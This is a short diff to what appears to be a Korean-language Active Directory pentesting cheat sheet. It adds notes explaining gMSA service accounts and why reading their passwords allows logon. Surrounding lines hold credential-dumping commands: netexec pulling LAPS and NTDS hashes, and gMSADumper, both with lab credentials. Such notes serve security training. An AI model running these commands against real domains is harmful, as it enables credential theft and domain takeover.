@@ -151,6 +151,9 @@ nxc smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
 ```
 
 ### ReadGMSAPassword
+- gMSA : Windows Server가 자동으로 비밀번호를 관리해주는 특수한 서비스 계정.
+- 비밀번호 관리의 번거로움과 사람이 개입해서 생기는 유출 리스크(약한 비밀번호, 평문 노출, 미교체 등)를 없애기 위해 사용.
+- 비밀번호를 읽을 수 있으면 그 gMSA로 실제 인증/로그온이 가능. 
 - https://github.com/rvazarkar/GMSAPasswordReader
 ```bash
 python3 gMSADumper.py -d inlanefreight.local -l 10.129.205.81 -u pedro -p SecuringAD01
